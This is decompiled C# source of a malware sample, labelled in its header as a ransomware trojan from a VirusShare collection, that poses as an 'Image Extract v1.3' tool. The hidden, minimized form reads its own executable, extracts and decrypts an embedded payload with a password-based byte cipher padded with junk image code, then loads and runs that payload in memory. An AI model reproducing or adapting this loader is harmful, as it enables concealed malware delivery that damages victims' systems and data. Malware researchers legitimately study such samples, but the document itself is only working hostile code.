// Decompiled with JetBrains decompiler
// Type: Image_Extract_v1._3.Jack
// Assembly: Image Extract v1.3, Version=2.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 809EAF0B-1D0F-479C-8C72-C488EAD8971A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.ajas-c89aefbf9dfaae2ed24b7acf962d62a14816ca42c5bb3e2a0d3f9390eceaa633.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

namespace Image_Extract_v1._3
{
  [DesignerGenerated]
  public class Jack : Form
  {
    private IContainer components;
    [AccessedThroughProperty("cbox")]
    private CheckBox _cbox;
    [AccessedThroughProperty("Button3")]
    private Button _Button3;
    [AccessedThroughProperty("RadioButton1")]
    private RadioButton _RadioButton1;
    [AccessedThroughProperty("MaskedTextBox1")]
    private MaskedTextBox _MaskedTextBox1;
    [AccessedThroughProperty("ProgressBar1")]
    private ProgressBar _ProgressBar1;
    [AccessedThroughProperty("PictureBox1")]
    private PictureBox _PictureBox1;
    [AccessedThroughProperty("Timer1")]
    private Timer _Timer1;
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    [AccessedThroughProperty("Button2")]
    private Button _Button2;
    [AccessedThroughProperty("ImageList1")]
    private ImageList _ImageList1;
    [AccessedThroughProperty("CheckedListBox1")]
    private CheckedListBox _CheckedListBox1;
    public string delim;
    private string exestr;
    private string spt1;
    private string spt3;
    private byte[] assbl;

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.cbox = new CheckBox();
      this.Button3 = new Button();
      this.RadioButton1 = new RadioButton();
      this.MaskedTextBox1 = new MaskedTextBox();
      this.ProgressBar1 = new ProgressBar();
      this.PictureBox1 = new PictureBox();
      this.Timer1 = new Timer(this.components);
      this.Button1 = new Button();
      this.Button2 = new Button();
      this.ImageList1 = new ImageList(this.components);
      this.CheckedListBox1 = new CheckedListBox();
      ((ISupportInitialize) this.PictureBox1).BeginInit();
      this.SuspendLayout();
      this.cbox.AutoSize = true;
      this.cbox.Checked = true;
      this.cbox.CheckState = CheckState.Checked;
      CheckBox cbox1 = this.cbox;
      Point point1 = new Point(329, 153);
      Point point2 = point1;
      cbox1.Location = point2;
      this.cbox.Name = "cbox";
      CheckBox cbox2 = this.cbox;
      Size size1 = new Size(81, 17);
      Size size2 = size1;
      cbox2.Size = size2;
      this.cbox.TabIndex = 4;
      this.cbox.Text = "CheckBox1";
      this.cbox.UseVisualStyleBackColor = true;
      Button button3_1 = this.Button3;
      point1 = new Point(466, 153);
      Point point3 = point1;
      button3_1.Location = point3;
      this.Button3.Name = "Button3";
      Button button3_2 = this.Button3;
      size1 = new Size(75, 23);
      Size size3 = size1;
      button3_2.Size = size3;
      this.Button3.TabIndex = 5;
      this.Button3.Text = "Button3";
      this.Button3.UseVisualStyleBackColor = true;
      this.RadioButton1.AutoSize = true;
      RadioButton radioButton1_1 = this.RadioButton1;
      point1 = new Point(309, 89);
      Point point4 = point1;
      radioButton1_1.Location = point4;
      this.RadioButton1.Name = "RadioButton1";
      RadioButton radioButton1_2 = this.RadioButton1;
      size1 = new Size(90, 17);
      Size size4 = size1;
      radioButton1_2.Size = size4;
      this.RadioButton1.TabIndex = 7;
      this.RadioButton1.TabStop = true;
      this.RadioButton1.Text = "RadioButton1";
      this.RadioButton1.UseVisualStyleBackColor = true;
      MaskedTextBox maskedTextBox1_1 = this.MaskedTextBox1;
      point1 = new Point(441, 100);
      Point point5 = point1;
      maskedTextBox1_1.Location = point5;
      this.MaskedTextBox1.Name = "MaskedTextBox1";
      MaskedTextBox maskedTextBox1_2 = this.MaskedTextBox1;
      size1 = new Size(100, 20);
      Size size5 = size1;
      maskedTextBox1_2.Size = size5;
      this.MaskedTextBox1.TabIndex = 8;
      ProgressBar progressBar1_1 = this.ProgressBar1;
      point1 = new Point(397, 230);
      Point point6 = point1;
      progressBar1_1.Location = point6;
      this.ProgressBar1.Name = "ProgressBar1";
      ProgressBar progressBar1_2 = this.ProgressBar1;
      size1 = new Size(100, 23);
      Size size6 = size1;
      progressBar1_2.Size = size6;
      this.ProgressBar1.TabIndex = 9;
      PictureBox pictureBox1_1 = this.PictureBox1;
      point1 = new Point(320, 222);
      Point point7 = point1;
      pictureBox1_1.Location = point7;
      this.PictureBox1.Name = "PictureBox1";
      PictureBox pictureBox1_2 = this.PictureBox1;
      size1 = new Size(100, 50);
      Size size7 = size1;
      pictureBox1_2.Size = size7;
      this.PictureBox1.TabIndex = 10;
      this.PictureBox1.TabStop = false;
      this.Timer1.Enabled = true;
      Button button1_1 = this.Button1;
      point1 = new Point(519, 208);
      Point point8 = point1;
      button1_1.Location = point8;
      this.Button1.Name = "Button1";
      Button button1_2 = this.Button1;
      size1 = new Size(75, 23);
      Size size8 = size1;
      button1_2.Size = size8;
      this.Button1.TabIndex = 11;
      this.Button1.Text = "Button1";
      this.Button1.UseVisualStyleBackColor = true;
      Button button2_1 = this.Button2;
      point1 = new Point(0, 0);
      Point point9 = point1;
      button2_1.Location = point9;
      this.Button2.Name = "Button2";
      Button button2_2 = this.Button2;
      size1 = new Size(75, 23);
      Size size9 = size1;
      button2_2.Size = size9;
      this.Button2.TabIndex = 12;
      this.Button2.Text = "Button2";
      this.Button2.UseVisualStyleBackColor = true;
      this.ImageList1.ColorDepth = ColorDepth.Depth8Bit;
      ImageList imageList1 = this.ImageList1;
      size1 = new Size(16, 16);
      Size size10 = size1;
      imageList1.ImageSize = size10;
      this.ImageList1.TransparentColor = Color.Transparent;
      this.CheckedListBox1.FormattingEnabled = true;
      CheckedListBox checkedListBox1_1 = this.CheckedListBox1;
      point1 = new Point(83, 106);
      Point point10 = point1;
      checkedListBox1_1.Location = point10;
      this.CheckedListBox1.Name = "CheckedListBox1";
      CheckedListBox checkedListBox1_2 = this.CheckedListBox1;
      size1 = new Size(130, 64);
      Size size11 = size1;
      checkedListBox1_2.Size = size11;
      this.CheckedListBox1.TabIndex = 13;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.Gainsboro;
      size1 = new Size(301, 259);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.CheckedListBox1);
      this.Controls.Add((Control) this.Button2);
      this.Controls.Add((Control) this.Button1);
      this.Controls.Add((Control) this.PictureBox1);
      this.Controls.Add((Control) this.ProgressBar1);
      this.Controls.Add((Control) this.MaskedTextBox1);
      this.Controls.Add((Control) this.RadioButton1);
      this.Controls.Add((Control) this.Button3);
      this.Controls.Add((Control) this.cbox);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Jack);
      this.ShowInTaskbar = false;
      this.Text = "Image Extract v1.3";
      this.TransparencyKey = Color.Gainsboro;
      this.WindowState = FormWindowState.Minimized;
      ((ISupportInitialize) this.PictureBox1).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual CheckBox cbox
    {
      get => this._cbox;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._cbox = value;
    }

    internal virtual Button Button3
    {
      get => this._Button3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Button3 = value;
    }

    internal virtual RadioButton RadioButton1
    {
      get => this._RadioButton1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._RadioButton1 = value;
    }

    internal virtual MaskedTextBox MaskedTextBox1
    {
      get => this._MaskedTextBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._MaskedTextBox1 = value;
    }

    internal virtual ProgressBar ProgressBar1
    {
      get => this._ProgressBar1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ProgressBar1 = value;
    }

    internal virtual PictureBox PictureBox1
    {
      get => this._PictureBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._PictureBox1 = value;
    }

    internal virtual Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Timer1 = value;
    }

    internal virtual Button Button1
    {
      get => this._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Button1 = value;
    }

    internal virtual Button Button2
    {
      get => this._Button2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Button2 = value;
    }

    internal virtual ImageList ImageList1
    {
      get => this._ImageList1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ImageList1 = value;
    }

    internal virtual CheckedListBox CheckedListBox1
    {
      get => this._CheckedListBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CheckedListBox1_SizeChanged);
        if (this._CheckedListBox1 != null)
          this._CheckedListBox1.SizeChanged -= eventHandler;
        this._CheckedListBox1 = value;
        if (this._CheckedListBox1 == null)
          return;
        this._CheckedListBox1.SizeChanged += eventHandler;
      }
    }

    public byte[] dcrp(string inputstring, string pass)
    {
      byte[] bytes = Encoding.Default.GetBytes(inputstring);
      int num1 = 0;
      string str1 = pass;
      int index1 = 0;
      int length = str1.Length;
      while (index1 < length)
      {
        char String = str1[index1];
        checked { num1 += Strings.Asc(String); }
        checked { ++index1; }
      }
      int num2 = checked (bytes.Length - 2);
      int index2 = 0;
      while (index2 <= num2)
      {
        int num3 = (int) bytes[index2];
        int num4 = (int) bytes[checked (index2 + 1)];
        int num5 = checked (2 * num4 - num1 - num3);
        int num6 = checked (num1 - num3 + num4);
        PictureBoxSizeMode pictureBoxSizeMode = PictureBoxSizeMode.CenterImage;
        try
        {
          PictureBox pictureBox;
          pictureBox.Image = (Image) null;
          pictureBox.SizeMode = pictureBoxSizeMode;
          string str2;
          if (File.Exists(str2))
          {
            Bitmap bitmap1 = (Bitmap) Image.FromFile(str2);
            double num7 = (double) bitmap1.Width / (double) pictureBox.Width;
            double num8 = (double) bitmap1.Height / (double) pictureBox.Height;
            Bitmap bitmap2;
            Rectangle rectangle;
            if (num7 > 1.0 | num8 > 1.0)
            {
              double num9 = num7 <= num8 ? num8 : num7;
              bitmap2 = new Bitmap(checked ((int) Math.Round(unchecked ((double) bitmap1.Width / num9))), checked ((int) Math.Round(unchecked ((double) bitmap1.Height / num9))));
              bitmap2.SetResolution(bitmap1.HorizontalResolution, bitmap1.VerticalResolution);
              Graphics graphics1 = Graphics.FromImage((Image) bitmap2);
              graphics1.InterpolationMode = InterpolationMode.HighQualityBicubic;
              Graphics graphics2 = graphics1;
              Bitmap bitmap3 = bitmap1;
              rectangle = new Rectangle(0, 0, checked ((int) Math.Round(unchecked ((double) bitmap1.Width / num9))), checked ((int) Math.Round(unchecked ((double) bitmap1.Height / num9))));
              Rectangle destRect = rectangle;
              int width = bitmap1.Width;
              int height = bitmap1.Height;
              graphics2.DrawImage((Image) bitmap3, destRect, 0, 0, width, height, GraphicsUnit.Pixel);
              graphics1.Dispose();
            }
            else
            {
              bitmap2 = new Bitmap(bitmap1.Width, bitmap1.Height);
              bitmap2.SetResolution(bitmap1.HorizontalResolution, bitmap1.VerticalResolution);
              Graphics graphics3 = Graphics.FromImage((Image) bitmap2);
              graphics3.InterpolationMode = InterpolationMode.HighQualityBicubic;
              Graphics graphics4 = graphics3;
              Bitmap bitmap4 = bitmap1;
              rectangle = new Rectangle(0, 0, bitmap1.Width, bitmap1.Height);
              Rectangle destRect = rectangle;
              int width = bitmap1.Width;
              int height = bitmap1.Height;
              graphics4.DrawImage((Image) bitmap4, destRect, 0, 0, width, height, GraphicsUnit.Pixel);
              graphics3.Dispose();
            }
            bitmap1.Dispose();
            pictureBox.Image = (Image) bitmap2;
          }
          else
            pictureBox.Image = (Image) null;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        while (num6 < 0)
          checked { num6 += 256; }
        while (num5 < 0)
          checked { num5 += 256; }
        bytes[index2] = checked ((byte) unchecked (num6 % 256));
        bytes[checked (index2 + 1)] = checked ((byte) unchecked (num5 % 256));
        checked { index2 += 2; }
      }
      return bytes;
    }

    public byte[] expat() => File.ReadAllBytes(Application.ExecutablePath);

    public Jack()
    {
      this.SizeChanged += new EventHandler(this.Jack_SizeChanged);
      this.Load += new EventHandler(this.Jack_Load);
      this.delim = "//fhsgfjsdzerbfd//";
      this.exestr = Encoding.Default.GetString(this.expat());
      this.spt1 = Strings.Split(this.exestr, this.delim)[1];
      this.spt3 = Strings.Split(this.exestr, this.delim)[3];
      this.assbl = this.dcrp(this.spt1, this.spt3);
      this.InitializeComponent();
      this.CheckedListBox1.Size = new Size(45, 55);
    }

    private void Jack_Load(object sender, EventArgs e)
    {
    }

    private void CheckedListBox1_SizeChanged(object sender, EventArgs e)
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void Jack_SizeChanged(object sender, EventArgs e)
    {
      NewLateBinding.LateCall(Activator.CreateInstance(Assembly.Load(this.assbl).GetType("Class1.Class1")), (System.Type) null, "start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      ProjectData.EndApp();
    }
  }
}
